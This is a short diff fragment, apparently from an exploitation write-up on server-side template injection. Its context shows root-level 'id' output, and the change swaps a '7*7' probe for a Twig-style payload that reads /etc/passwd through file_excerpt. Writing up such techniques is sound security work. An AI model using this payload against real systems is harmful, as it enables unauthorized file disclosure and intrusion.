@@ -245,5 +245,5 @@ uid=0(root) gid=0(root) groups=0(root)
 We are root.
 
 ```
-{{ 7*'7' }}
+"{{ '/etc/passwd' |file_excerpt(1,30) }}"@
 ```
